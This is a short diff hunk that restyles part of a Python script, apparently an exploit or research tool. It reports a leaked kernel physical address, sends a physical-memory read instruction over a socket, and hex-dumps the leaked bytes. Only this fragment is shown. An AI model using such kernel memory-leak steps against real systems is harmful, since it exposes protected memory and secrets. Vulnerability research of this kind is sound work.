@@ -23,8 +23,13 @@ def startManage(sock_fd, logger):
     logger.info('The leaked kernel physical address is: 0x%016x', p_leaked_addr)
 
     logger.info('Sending the memory read instruction')
-    data = sendInstr(sock_fd, instrPhyRead((p_leaked_addr - 0x1000) & (2 ** 64 - 1 - (0x1000 - 1)), 256), logger)
-    if data:
+    if data := sendInstr(
+        sock_fd,
+        instrPhyRead(
+            (p_leaked_addr - 0x1000) & (2**64 - 1 - (0x1000 - 1)), 256
+        ),
+        logger,
+    ):
         logger.info('The leaked data is:')
         logger.addIndent()
         logger.info(hexDump(data))
